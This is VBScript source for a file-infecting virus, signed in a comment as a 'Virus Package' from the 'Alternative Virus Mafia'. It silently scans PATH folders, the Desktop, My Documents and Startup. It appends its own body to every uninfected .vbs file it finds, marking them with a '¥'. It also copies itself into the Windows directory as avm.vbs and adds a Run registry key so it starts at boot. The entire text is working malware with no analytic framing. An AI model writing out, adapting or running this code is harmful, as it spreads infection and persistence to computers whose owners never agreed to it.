On Error Resume Next
Dim IV6, U187, IV7, IV1, IV2, IV3, IV4
Dim T111
Dim IV5(200)
Dim XR
Set WSHShell = Wscript.CreateObject(""Wscript.Shell"")
Set WshSysEnv = WSHShell.Environment(""Process"")
IV10 = WshSysEnv(""Path"")
IV7 = WSHShell.ExpandEnvironmentStrings(""%windir%\avm.vbs"")
IV1 = Wscript.ScriptFullName
Set IV6 = CreateObject(""Scripting.FileSystemObject"")
XR = 1
T11 = Wscript.ScriptFullName
For x = Len(IV10) To 1 Step -1
IV4 = Mid(IV10, x, 1)
If IV4 <> "";"" Then
IV5(XR) = IV4 + IV5(XR)
ElseIf IV4 = "";"" Then
IV5(XR) = IV5(XR) + ""\""
XR = XR + 1
End If
Next
IV5(XR) = IV5(XR) + ""\""
IV5(XR + 1) = WSHShell.SpecialFolders(""Desktop"") + ""\""
IV5(XR + 2) = WSHShell.SpecialFolders(""MyDocuments"") + ""\""
IV5(XR + 3) = WSHShell.SpecialFolders(""Startup"") + ""\""
IV5(XR + 4) = Left(T11, InStrRev(T11, ""\""))
Set TS = IV6.OpenTextFile(T11, 1)
IV9 = TS.ReadAll
TS.Close
IV8 = Chr(167)
endIV8 = ""'"" & IV8
For x = Len(IV9) To 1 Step -1
If Mid(IV9, x, 1) = IV8 Then
x = 1
IV3 = endIV8 + IV3
ElseIf Mid(IV9, x, 1) <> IV8 Then
IV3 = Mid(IV9, x, 1) + IV3
End If
Next
For y = 1 To (XR + 4)
For Each Target In IV6.GetFolder(IV5(y)).Files
If UCase(Right(Target.Name, 3)) = ""VBS"" Then
IV11 = """"
Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 1)
IV11 = TS.ReadAll
TS.Close
If mid(IV11,(len(IV11)-2),1) <> ""¥"" Then
Set TS = IV6.OpenTextFile(IV5(y) & Target.Name, 8)
TS.Write IV3
TS.Close
End If
End If
Next
Next
FIV11 (IV7)
If T111 = False Then
WSHShell.RegWrite ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AVM"", IV7
Set U187 = IV6.OpenTextFile(IV7, 2, True)
U187.Write IV3
U187.Close
End If
Function FIV11(filespec)
Set IV6 = CreateObject(""Scripting.FileSystemObject"")
If (IV6.FileExists(filespec)) Then
T111 = True
Else
T111 = False
End If
End Function
' Nick ""The Love Monkey"" Virus Package by ALT-F4 and ALT-F11 for the Alternative Virus Mafia"
'¥"
